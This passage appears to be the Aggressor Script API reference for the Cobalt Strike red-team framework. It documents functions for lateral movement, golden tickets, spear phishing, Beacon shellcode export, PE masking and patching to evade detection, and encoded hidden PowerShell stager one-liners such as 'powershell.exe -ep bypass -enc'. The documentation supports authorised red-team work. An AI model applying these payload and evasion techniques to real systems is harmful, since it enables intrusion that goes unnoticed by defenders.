$1 - the Beacon ID to apply this feature to

Example
item "VPN Pivoting" {
   local('$bid');
   foreach $bid ($1) {
      openCovertVPNSetup($bid);
   }
}
Back to Top

openCredentialManager
Open the credential manager tab.

Example
openCredentialManager();
Back to Top

openDefaultShortcutsDialog
Open the Default Keyboard Shortcuts dialog. This function does not have any parameters.

Back to Top

openDownloadBrowser
Open the download browser tab

Example
openDownloadBrowser();
Back to Top

openElevateDialog
Open the dialog to launch a privilege escalation exploit.

Arguments
$1 - the beacon ID

Example
item "Elevate" {
   local('$bid');
   foreach $bid ($1) {
      openElevateDialog($bid);
   }
}
Back to Top

openEventLog
Open the event log.

Example
openEventLog();
Back to Top

openFileBrowser
Open the file browser for a Beacon

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Browse Files" {
   local('$bid');
   foreach $bid ($1) {
      openFileBrowser($bid);
   }
}
Back to Top

openGoldenTicketDialog
open a dialog to help generate a golden ticket

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Golden Ticket" {
   local('$bid');
   foreach $bid ($1) {
      openGoldenTicketDialog($bid);
   }
}
Back to Top

openHTMLApplicationDialog
Open the HTML Application Dialog.

Example
openHTMLApplicationDialog();
Back to Top

openHostFileDialog
Open the host file dialog.

Example
openHostFileDialog();
Back to Top

openInterfaceManager
Open the tab to manage Covert VPN interfaces

Example
openInterfaceManager();
Back to Top

openJavaSignedAppletDialog
Open the Java Signed Applet dialog

Example
openJavaSignedAppletDialog();
Back to Top

openJavaSmartAppletDialog
Open the Java Smart Applet dialog

Example
openJavaSmartAppletDialog();
Back to Top

openJumpDialog
Open Cobalt Strike's lateral movement dialog

Arguments
$1 - the type of lateral movement. See &beacon_remote_exploits for a list of options. ssh and ssh-key are options too.

$2 - an array of targets to apply this action against

Example
openJumpDialog("psexec_psh", @("192.168.1.3", "192.168.1.4"));
Back to Top

openKeystrokeBrowser
Open the keystroke browser tab

Example
openKeystrokeBrowser();
Back to Top

openListenerManager
Open the listener manager

Example
openListenerManager();
Back to Top

openMakeTokenDialog
open a dialog to help generate an access token

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Make Token" {
   local('$bid');
   foreach $bid ($1) {
      openMakeTokenDialog($bid);
   }
}
Back to Top

openMalleableProfileDialog
Open the malleable C2 profile dialog.

Example
openMalleableProfileDialog();
Back to Top

openOfficeMacro
Open the office macro export dialog

Example
openOfficeMacroDialog();
Back to Top

openOneLinerDialog
Open the dialog to generate a PowerShell one-liner for this specific Beacon session.

Arguments
$1 - the beacon ID

Example
item "&One-liner" {
   openOneLinerDialog($1);
}
Back to Top

openOrActivate
If a Beacon console exists, make it active. If a Beacon console does not exist, open it.

Arguments
$1 - the Beacon ID

Example
item "&Activate" {
   local('$bid');
   foreach $bid ($1) {
      openOrActivate($bid);
   }
}
Back to Top

openPayloadGeneratorDialog
Open the Payload Generator dialog.

Example
openPayloadGeneratorDialog();
Back to Top

openPayloadHelper
Open a payload chooser dialog.

Arguments
$1 - a callback function. Arguments: $1 - the selected listener.

Example
openPayloadHelper(lambda({
   bspawn($bid, $1);
}, $bid => $1));
Back to Top

openPivotListenerSetup
open the pivot listener setup dialog

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Listener..." {
   local('$bid');
   foreach $bid ($1) {
      openPivotListenerSetup($bid);
   }
}
Back to Top

openPortScanner
Open the port scanner dialog

Arguments
$1 - an array of targets to scan

Example
openPortScanner(@("192.168.1.3"));
Back to Top

openPortScannerLocal
Open the port scanner dialog with options to target a Beacon's local network

Arguments
$1 - the beacon to target with this feature

Example
item "Scan" {
   local('$bid');
   foreach $bid ($1) {
      openPortScannerLocal($bid);
   }
}
Back to Top

openPowerShellWebDialog
Open the dialog to setup the PowerShell Web Delivery Attack

Example
openPowerShellWebDialog();
Back to Top

openPreferencesDialog
Open the preferences dialog

Example
openPreferencesDialog();
Back to Top

openProcessBrowser
Open a process browser for one or more Beacons

Arguments
$1 - the id for the beacon. This may be an array or a single ID.

Example
item "Processes" {
   openProcessBrowser($1);
}
Back to Top

openSOCKSBrowser
Open the tab to list SOCKS proxy servers

Example
openSOCKSBrowser();
Back to Top

openSOCKSSetup
open the SOCKS proxy server setup dialog

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "SOCKS Server" {
   local('$bid');
   foreach $bid ($1) {
      openSOCKSSetup($bid);
   }
}
Back to Top

openScreenshotBrowser
Open the screenshot browser tab

Example
openScreenshotBrowser();
Back to Top

openScriptConsole
Open the Aggressor Script console.

Example
openScriptConsole();
Back to Top

openScriptManager
Open the tab for the script manager.

Example
openScriptManager();
Back to Top

openScriptedWebDialog
Open the dialog to setup a Scripted Web Delivery Attack

Example
openScriptedWebDialog();
Back to Top

openServiceBrowser
Open service browser dialog

Arguments
$1 - an array of targets to show services for

Example
openServiceBrowser(@("192.168.1.3"));
Back to Top

openSiteManager
Open the site manager.

Example
openSiteManager();
Back to Top

openSpawnAsDialog
Open dialog to spawn a payload as another user

Arguments
$1 - the Beacon ID to apply this feature to

Example
item "Spawn As..." {
   local('$bid');
   foreach $bid ($1) {
      openSpawnAsDialog($bid);
   }
}
Back to Top

openSpearPhishDialog
Open the dialog for the spear phishing tool.

Example
openSpearPhishDialog();
Back to Top

openSystemInformationDialog
Open the system information dialog.

Example
openSystemInformationDialog();
Back to Top

openSystemProfilerDialog
Open the dialog to setup the system profiler.

Example
openSystemProfilerDialog();
Back to Top

openTargetBrowser
Open the targets browser

Example
openTargetBrowser();
Back to Top

openWebLog
Open the web log tab.

Example
openWebLog();
Back to Top

openWindowsDropperDialog
REMOVED Removed in Cobalt Strike 4.0.

openWindowsExecutableDialog
Open the dialog to generate a Windows executable.

Example
openWindowsExecutableDialog();
Back to Top

openWindowsExecutableStage
Open the dialog to generate a stageless Windows executable.

Example
openWindowsExecutableStage();
Back to Top

openWindowsExecutableStageAllDialog
Open the dialog to generate all of the stageless payloads (in x86 and x64) for all of the configured listeners. This dialog can also be found in the UI menu under Payloads -> Windows Stageless Generate all Payloads.

Example
openWindowsExecutableStageAllDialog();
Back to Top

payload
Exports a raw payload for a specific Cobalt Strike listener.

Arguments
$1 - the listener name

$2 - x86|x64 the architecture of the payload

$3 - exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.

$4 - A string value for the system call method. Valid values are:

None: Use the standard Windows API function.
Direct: Use the Nt* version of the function.

Indirect: Jump to the appropriate instruction within the Nt* version of the function.

$5 - (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).

Returns
A scalar containing position-independent code for the specified listener.

Example
$data = payload("my listener", "x86", "process", "Direct");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
Back to Top

payload_bootstrap_hint
Get the offset to function pointer hints used by Beacon's Reflective Loader. Populate these hints with the asked-for process addresses to have Beacon load itself into memory in a more OPSEC-safe way.

Arguments
$1 - the payload position-independent code (specifically, Beacon)

$2 - the function to get the patch location for

Notes
Cobalt Strike's Beacon has a protocol to accept artifact-provided function pointers for functions required by Beacon's Reflective Loader. The protocol is to patch the location of GetProcAddress and GetModuleHandleA into the Beacon DLL. Use of this protocol allows Beacon to load itself in memory without triggering shellcode detection heuristics that monitor reads of kernel32's Export Address Table. This protocol is optional. Artifacts that don't follow this protocol will fallback to resolving key functions via the Export Address Table.
The Artifact Kit and Resource Kit both implement this protocol. Download these kits to see how to use this function.
Returns
The offset to a memory location to patch with a pointer for a specific function used by Beacon's Reflective Loader.

Back to Top

payload_local
Exports a raw payload for a specific Cobalt Strike listener. Use this function when you plan to spawn this payload from another Beacon session. Cobalt Strike will generate a payload that embeds key function pointers, needed to bootstrap the agent, taken from the parent session's metadata.

Arguments
$1 - the parent Beacon session ID

$2 - the listener name

$3 - x86|x64 the architecture of the payload

$4 - exit method: 'thread' (leave the thread when done) or 'process' (exit the process when done). Use 'thread' if injecting into an existing process.

$5 - A string value for the system call method. Valid values are:

None: Use the standard Windows API function.
Direct: Use the Nt* version of the function.

Indirect: Jump to the appropriate instruction within the Nt* version of the function.

$6 - (optional) The supporting HTTP library for generated beacons (wininet|winhttp|$null|blank string).

Returns
A scalar containing position-independent code for the specified listener.

Example
$data = payload_local($bid, "my listener", "x86", "process", "None");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
Back to Top

pe_insert_rich_header
Insert rich header data into Beacon DLL Content. If there is existing rich header information, it will be replaced.

Arguments
$1 - Beacon DLL content

$2 - Rich header

Returns
Updated DLL Content

Note
The rich header length should be on a 4 byte boundary for subsequent checksum calculations.

Example
# -------------------------------------
# Insert (replace) rich header
# -------------------------------------
$rich_header = "<your rich header info>";
$temp_dll = pe_insert_rich_header($temp_dll, $rich_header);
Back to Top

pe_mask
Mask data in the Beacon DLL Content based on position and length.

Arguments
$1 - Beacon DLL content

$2 - Start location

$3 - Length to mask

$4 - Byte value mask key (int)

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_mask {

   local('$temp_dll, $start, $length, $maskkey');
   local('%pemap');
   local('@loc_en, @val_en');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc_en = values(%pemap, @("Export.Name."));
   @val_en = values(%pemap, @("Export.Name."));

   if (size(@val_en) != 1) {
      warn("Unexpected size of export name value array: " . size(@val_en));
   } else {
      warn("Current export value: " . @val_en[0]);
   }

   if (size(@loc_en) != 1) {
      warn("Unexpected size of export location array: " . size(@loc_en));
   } else {
      warn("Current export name location: " . @loc_en[0]);
   }

   # -------------------------------------
   # Set parameters (parse number as base 10)
   # -------------------------------------
   $start = parseNumber(@loc_en[0], 10);
   $length = 4;
   $maskkey = 22;

   # -------------------------------------
   # mask some data in a dll
   # -------------------------------------
   # warn("pe_mask(dll, " . $start . ", " . $length . ", " . $maskkey . ")");
   $temp_dll = pe_mask($temp_dll, $start, $length, $maskkey);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # un-mask (running the same mask a second time should "un-mask")
   # (This would normally be done by the reflective loader)
   # -------------------------------------
   # warn("pe_mask(dll, " . $start . ", " . $length . ", " . $maskkey . ")");
   # $temp_dll = pe_mask($temp_dll, $start, $length, $maskkey);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_mask_section
Mask data in the Beacon DLL Content based on position and length.

Arguments
$1 - Beacon DLL content

$2 - Section name

$3 - Byte value mask key (int)

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_mask_section {

   local('$temp_dll, $section_name, $maskkey');
   local('@loc_en, @val_en');

   $temp_dll = $1;

   # -------------------------------------
   # Set parameters
   # -------------------------------------
   $section_name = ".text";
   $maskkey = 23;

   # -------------------------------------
   # mask a section in a dll
   # -------------------------------------
   # warn("pe_mask_section(dll, " . $section_name . ", " . $maskkey . ")");
   $temp_dll = pe_mask_section($temp_dll, $section_name, $maskkey);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # un-mask (running the same mask a second time should "un-mask")
   # (This would normally be done by the reflective loader)
   # -------------------------------------
   # warn("pe_mask_section(dll, " . $section_name . ", " . $maskkey . ")");
   # $temp_dll = pe_mask_section($temp_dll, $section_name, $maskkey);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_mask_string
Mask a string in the Beacon DLL Content based on position.

Arguments
$1 - Beacon DLL content

$2 - Start location

$3 - Byte value mask key (int)

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_mask_string {

   local('$temp_dll, $location, $length, $maskkey');
   local('%pemap');
   local('@loc);

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc = values(%pemap, @("Sections.AddressOfName.0."));

   if (size(@loc) != 1) {
      warn("Unexpected size of section name location array: " . size(@loc));
   } else {
      warn("Current section name location: " . @loc[0]);
   }

   # -------------------------------------
   # Set parameters
   # -------------------------------------
   $location = @loc[0];
   $length = 5;
   $maskkey = 23;

   # -------------------------------------
   # pe_mask_string (mask a string in a dll)
   # -------------------------------------
   # warn("pe_mask_string(dll, " . $location . ", " . $maskkey . ")");
   $temp_dll = pe_mask_string($temp_dll, $location, $maskkey);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # un-mask (running the same mask a second time should "un-mask")
   # we are unmasking the length of the string and the null character
   # (This would normally be done by the reflective loader)
   # -------------------------------------
   # warn("pe_mask(dll, " . $location . ", " . $length . ", " . $maskkey . ")");
   # $temp_dll = pe_mask($temp_dll, $location, $length, $maskkey);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_patch_code
Patch code in the Beacon DLL Content based on find/replace in '.text' section'.

Arguments
$1 - Beacon DLL content

$2 - byte array to find for resolve offset

$3 - byte array place at resolved offset (overwrite data)

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content

# ===========================================================================
sub demo_pe_patch_code {

   local('$temp_dll, $findme, $replacement');

   $temp_dll = $1;

   # ====== simple text values ======
   $findme = "abcABC123";
   $replacement = "123ABCabc";

   # warn("pe_patch_code(dll, " . $findme . ", " . $replacement . ")");
   $temp_dll = pe_patch_code($temp_dll, $findme, $replacement);

   # ====== byte array as a hex string ======
   $findme = "\x01\x02\x03\xfc\xfe\xff";
   $replacement = "\x01\x02\x03\xfc\xfe\xff";

   # warn("pe_patch_code(dll, " . $findme . ", " . $replacement . ")");
   $temp_dll = pe_patch_code($temp_dll, $findme, $replacement);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_remove_rich_header
Remove the rich header from Beacon DLL Content.

Arguments
$1 - Beacon DLL content

Returns
Updated DLL Content

Example
# -------------------------------------
# Remove/Replace Rich Header
# -------------------------------------
$temp_dll = pe_remove_rich_header($temp_dll);
Back to Top

pe_set_compile_time_with_long
Set the compile time in the Beacon DLL Content.

Arguments
$1 - Beacon DLL content

$2 - Compile Time (as a long in milliseconds)

Returns
Updated DLL Content

Example
# date is in milliseconds ("1893521594000" = "01 Jan 2030 12:13:14")
$date = 1893521594000;
$temp_dll = pe_set_compile_time_with_long($temp_dll, $date);

# date is in milliseconds ("1700000001000" = "14 Nov 2023 16:13:21")
$date = 1700000001000;
$temp_dll = pe_set_compile_time_with_long($temp_dll, $date);
Back to Top

pe_set_compile_time_with_string
Set the compile time in the Beacon DLL Content.

Arguments
$1 - Beacon DLL content

$2 - Compile Time (as a string)

Returns
Updated DLL Content

Example
# ("01 Jan 2020 15:16:17" = "1577913377000")
$strTime = "01 Jan 2020 15:16:17";
$temp_dll = pe_set_compile_time_with_string($temp_dll, $strTime);
Back to Top

pe_set_export_name
Set the export name in the Beacon DLL Content.

Arguments
$1 - Beacon DLL content

Returns
Updated DLL Content

Note
The name must exist in the string table.

Example
# -------------------------------------
# name must be in strings table...
# -------------------------------------
$export_name = "WININET.dll";
$temp_dll = pe_set_export_name($temp_dll, $export_name);

$export_name = "beacon.dll";
$temp_dll = pe_set_export_name($temp_dll, $export_name);
Back to Top

pe_set_long
Places a long value at a specified location.

Arguments
$1 - Beacon DLL content

$2 - Location

$3 - Value

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_long {

   local('$temp_dll, $int_offset, $long_value');
   local('%pemap');
   local('@loc_cs, @val_cs');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc_cs = values(%pemap, @("CheckSum.<location>"));
   @val_cs = values(%pemap, @("CheckSum.<value>"));

   if (size(@val_cs) != 1) {
      warn("Unexpected size of checksum value array: " . size(@val_cs));
   } else {
      warn("Current checksum value: " . @val_cs[0]);
   }

   if (size(@loc_cs) != 1) {
      warn("Unexpected size of checksum location array: " . size(@loc_cs));
   } else {
      warn("Current checksum location: " . @loc_cs[0]);
   }

   # -------------------------------------
   # Set parameters (parse number as base 10)
   # -------------------------------------
   $int_offset = parseNumber(@loc_cs[0], 10);
   $long_value = 98765;

   # -------------------------------------
   # pe_set_long (set a long value)
   # -------------------------------------
   # warn("pe_set_long(dll, " . $int_offset . ", " . $long_value . ")");
   $temp_dll = pe_set_long($temp_dll, $int_offset, $long_value);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_set_short
Places a short value at a specified location.

Arguments
$1 - Beacon DLL content

$2 - Location

$3 - Value

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_short {

   local('$temp_dll, $int_offset, $short_value');
   local('%pemap');
   local('@loc, @val');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc = values(%pemap, @(".text.NumberOfRelocations."));
   @val = values(%pemap, @(".text.NumberOfRelocations."));

   if (size(@val) != 1) {
      warn("Unexpected size of .text.NumberOfRelocations value array: " . size(@val));
   } else {
      warn("Current .text.NumberOfRelocations value: " . @val[0]);
   }

   if (size(@loc) != 1) {
      warn("Unexpected size of .text.NumberOfRelocations location array: " . size(@loc));
   } else {
      warn("Current .text.NumberOfRelocations location: " . @loc[0]);
   }

   # -------------------------------------
   # Set parameters (parse number as base 10)
   # -------------------------------------
   $int_offset = parseNumber(@loc[0], 10);
   $short_value = 128;

   # -------------------------------------
   # pe_set_short (set a short value)
   # -------------------------------------
   # warn("pe_set_short(dll, " . $int_offset . ", " . $short_value . ")");
   $temp_dll = pe_set_short($temp_dll, $int_offset, $short_value);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_set_string
Places a string value at a specified location.

Arguments
$1 - Beacon DLL content

$2 - Start location

$3 - Value

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_string {

   local('$temp_dll, $location, $value');
   local('%pemap');
   local('@loc_en, @val_en');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc_en = values(%pemap, @("Export.Name."));
   @val_en = values(%pemap, @("Export.Name."));

   if (size(@val_en) != 1) {
      warn("Unexpected size of export name value array: " . size(@val_en));
   } else {
      warn("Current export value: " . @val_en[0]);
   }

   if (size(@loc_en) != 1) {
      warn("Unexpected size of export location array: " . size(@loc_en));
   } else {
      warn("Current export name location: " . @loc_en[0]);
   }

   # -------------------------------------
   # Set parameters (parse number as base 10)
   # -------------------------------------
   $location = parseNumber(@loc_en[0], 10);
   $value = "BEECON.DLL";

   # -------------------------------------
   # pe_set_string (set a string value)
   # -------------------------------------
   # warn("pe_set_string(dll, " . $location . ", " . $value . ")");
   $temp_dll = pe_set_string($temp_dll, $location, $value);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_set_stringz
Places a string value at a specified location and adds a zero terminator.

Arguments
$1 - Beacon DLL content

$2 - Start location

$3 - String to set

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_set_stringz {

   local('$temp_dll, $offset, $value');
   local('%pemap');
   local('@loc');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc = values(%pemap, @("Sections.AddressOfName.0."));

   if (size(@loc) != 1) {
      warn("Unexpected size of section name location array: " . size(@loc));
   } else {
      warn("Current section name location: " . @loc[0]);
   }

   # -------------------------------------
   # Set parameters (parse number as base 10)
   # -------------------------------------
   $offset = parseNumber(@loc[0], 10);
   $value = "abc";

   # -------------------------------------
   # pe_set_stringz
   # -------------------------------------
   # warn("pe_set_stringz(dll, " . $offset . ", " . $value . ")");
   $temp_dll = pe_set_stringz($temp_dll, $offset, $value);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # Set parameters
   # -------------------------------------
   # $offset = parseNumber(@loc[0], 10);
   # $value = ".tex";

   # -------------------------------------
   # pe_set_string (set a string value)
   # -------------------------------------
   # warn("pe_set_string(dll, " . $offset . ", " . $value . ")");
   # $temp_dll = pe_set_string($temp_dll, $offset, $value);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_set_value_at
Sets a long value based on the location resolved by a name from the PE Map (see pedump).

Arguments
$1 - Beacon DLL content

$2 - Name of location field

$3 - Value

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = DLL content
# ===========================================================================
sub demo_pe_set_value_at {

   local('$temp_dll, $name, $long_value, $date');
   local('%pemap');
   local('@loc, @val');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   # %pemap = pedump($temp_dll);
   # @loc = values(%pemap, @("SizeOfImage."));
   # @val = values(%pemap, @("SizeOfImage."));

   # if (size(@val) != 1) {
   #   warn("Unexpected size of SizeOfImage. value array: " . size(@val));
   # } else {
   #   warn("Current SizeOfImage. value: " . @val[0]);
   # }

   # if (size(@loc) != 1) {
   #   warn("Unexpected size of SizeOfImage location array: " . size(@loc));
   # } else {
   #   warn("Current SizeOfImage. location: " . @loc[0]);
   # }

   # -------------------------------------
   # Set parameters
   # -------------------------------------
   $name = "SizeOfImage";
   $long_value = 22334455;

   # -------------------------------------
   # pe_set_value_at (set a long value at the location resolved by name)
   # -------------------------------------
   # $1 = DLL (byte array)
   # $2 = name (string)
   # $3 = value (long)
   # -------------------------------------
   warn("pe_set_value_at(dll, " . $name . ", " . $long_value . ")");
   $temp_dll = pe_set_value_at($temp_dll, $name, $long_value);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # set it back?
   # -------------------------------------
   # warn("pe_set_value_at(dll, " . $name . ", " . @val[0] . ")");
   # $temp_dll = pe_set_value_at($temp_dll, $name, @val[0]);

   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_stomp
Set a string to null characters. Start at a specified location and sets all characters to null until a null string terminator is reached.

Arguments
$1 - Beacon DLL content

$2 - Start location

Returns
Updated DLL Content

Example
# ===========================================================================
# $1 = Beacon DLL content
# ===========================================================================
sub demo_pe_stomp {

   local('$temp_dll, $offset, $value, $old_name');
   local('%pemap');
   local('@loc, @val');

   $temp_dll = $1;

   # -------------------------------------
   # Inspect the current DLL...
   # -------------------------------------
   %pemap = pedump($temp_dll);
   @loc = values(%pemap, @("Sections.AddressOfName.1."));
   @val = values(%pemap, @("Sections.AddressOfName.1."));

   if (size(@val) != 1) {
      warn("Unexpected size of Sections.AddressOfName.1 value array: " . size(@val));
   } else {
      warn("Current Sections.AddressOfName.1 value: " . @val[0]);
   }

   if (size(@loc) != 1) {
      warn("Unexpected size of Sections.AddressOfName.1 location array: " . size(@loc));
   } else {
      warn("Current Sections.AddressOfName.1 location: " . @loc[0]);
   }

   # -------------------------------------
   # Set parameters (parse number as base 10)
   # -------------------------------------
   $location = parseNumber(@loc[0], 10);

   # -------------------------------------
   # pe_stomp (stomp a string at a location)
   # -------------------------------------
   # warn("pe_stomp(dll, " . $location . ")");
   $temp_dll = pe_stomp($temp_dll, $location);

   # -------------------------------------
   # Did it work?
   # -------------------------------------
   # dump_my_pe($temp_dll);

   # -------------------------------------
   # All Done!  Give back edited DLL!
   # -------------------------------------
   return $temp_dll;
}
Back to Top

pe_update_checksum
Update the checksum in the Beacon DLL Content.

Arguments
$1 - Beacon DLL content

Returns
Updated DLL Content

Note
This should be the last transformation performed.

Example
# -------------------------------------
# update checksum
# -------------------------------------
$temp_dll = pe_update_checksum($temp_dll);
Back to Top

pedump
Parse an executable Beacon into a map of the PE Header information. The parsed information can be used for research or programmatically to make changes to the Beacon.

Arguments
$1 - Beacon DLL content

Returns
A map of the parsed information. The map data is very similar to the "./peclone dump [file]" command output.

Example
# ===========================================================================
# 'case insensitive sort' from sleep manual...
# ===========================================================================
sub caseInsensitiveCompare
{
   $a = lc($1);
   $b = lc($2);
   return $a cmp $b;
}

# ===========================================================================
# Dump PE Information
# $1 = Beacon DLL content
# ===========================================================================
sub dump_my_pe {
   local('$out $key $val %pemap @sorted_keys');

   %pemap = pedump($1);

   # ---------------------------------------------------
   # Example listing all items from hash/map...
   # ---------------------------------------------------
   @sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));
   foreach $key (@sorted_keys)
   {
      $out = "$[50]key";
      foreach $val (values(%pemap, @($key)))
      {
         $out .= " $val";
         println($out);
      }
   }

   # ---------------------------------------------------
   # Example of grabbing specific items from hash/map...
   # ---------------------------------------------------
   local('@loc_cs @val_cs');
   @loc_cs = values(%pemap, @("CheckSum.<location>"));
   @val_cs = values(%pemap, @("CheckSum.<value>"));

   println("");
   println("My DLL CheckSum Location: " . @loc_cs);
   println("My DLL CheckSum Value: " . @val_cs);
   println("");
}
See also
./peclone dump [file]

Back to Top

pgraph
Generate the pivot graph GUI component.

Returns
The pivot graph GUI object (a javax.swing.JComponent)

Example
addVisualization("Pivot Graph", pgraph());
See also
&showVisualization

Back to Top

pivots
Returns a list of SOCKS pivots from Cobalt Strike's data model.

Returns
An array of dictionary objects with information about each pivot.

Example
printAll(pivots());
Back to Top

popup_clear
Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.

Arguments
$1 - the popup hook to clear registered menus for

Example
popup_clear("help");

popup help {
   item "My stuff!" {
      show_message("This is my menu!");
   }
}
Back to Top

powershell
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager and &powershell_command instead.

Returns a PowerShell one-liner to bootstrap the specified listener.

Arguments
$1 - the listener name

$2 - [true/false]: is this listener targeting local host?

$3 - x86|x64 - the architecture of the generated stager.

Notes
Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

Returns
A PowerShell one-liner to run the specified listener.

Example
println(powershell("my listener", false));
Back to Top

powershell_command
Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)

Arguments
$1 - the PowerShell expression to wrap into a one-liner.

$2 - will the PowerShell command run on a remote target?

Returns
Returns a powershell.exe one-liner to run the specified expression.

Example
$cmd = powershell_command("2 + 2", false);
println($cmd);
Back to Top

powershell_compress
Compresses a PowerShell script and wraps it in a script to decompress and execute it.

Arguments
$1 - the PowerShell script to compress.

Example
$script = powershell_compress("2 + 2");
Back to Top

powershell_encode_oneliner
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &powershell_command instead.

Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)

Arguments
$1 - the PowerShell expression to wrap into a one-liner.

Returns a powershell.exe one-liner to run the specified expression.

Example
$cmd = powershell_encode_oneliner("2 + 2");
println($cmd);
Back to Top

powershell_encode_stager
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_general and &powershell_command instead.

Returns a base64 encoded PowerShell script to run the specified shellcode

Arguments
$1 - shellcode to wrap

Returns
Returns a base64 encoded PowerShell suitable for use with powershell.exe's -enc option.

Example
$shellcode  = shellcode("my listener", false);
$readytouse = powershell_encode_stager($shellcode);
println("powershell.exe -ep bypass -enc $readytouse");
Back to Top

pref_get
Grabs a string value from Cobalt Strike's preferences.

Arguments
$1 - the preference name

$2 - the default value [if there is no value for this preference]

Returns
A string with the preference value.

Example
$foo = pref_get("foo.string", "bar");
Back to Top

pref_get_list
Grabs a list value from Cobalt Strike's preferences.

Arguments
$1 - the preference name

Returns
An array with the preference values

Example
@foo = pref_get_list("foo.list");
Back to Top

pref_set
Set a value in Cobalt Strike's preferences

Arguments
$1 - the preference name

$2 - the preference value

Example
pref_set("foo.string", "baz!");
Back to Top

pref_set_list
Stores a list value into Cobalt Strike's preferences.

Arguments
$1 - the preference name

$2 - an array of values for this preference

Example
pref_set_list("foo.list", @("a", "b", "c"));
Back to Top

previousTab
Activate the tab that is to the left of the current tab.

Example
bind Ctrl+Left {
   previousTab();
}
Back to Top

process_browser
Opens the Process Browser. This function does not have any parameters.

Back to Top

privmsg
Post a private message to a user in the event log

Arguments
$1 - who to send the message to   

$2 - the message

Example
privmsg("raffi", "what's up man?");
Back to Top

prompt_confirm
Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.

Arguments
$1 - text in the dialog

$2 - title of the dialog

$3 - a callback function. Called when the user presses yes.

Example
prompt_confirm("Do you feel lucky?", "Do you?", {
   show_mesage("Ok, I got nothing");
});
Back to Top

prompt_directory_open
Show a directory open dialog.

Arguments
$1 - title of the dialog

$2 - default value

$3 - true/false: allow user to select multiple folders?

$4 - a callback function. Called when the user chooses a folder. The argument to the callback is the selected folder. If multiple folders are selected, they will still be specified as the first argument, separated by commas.

Example
prompt_directory_open("Choose a folder", $null, false, {
   show_message("You chose: $1");
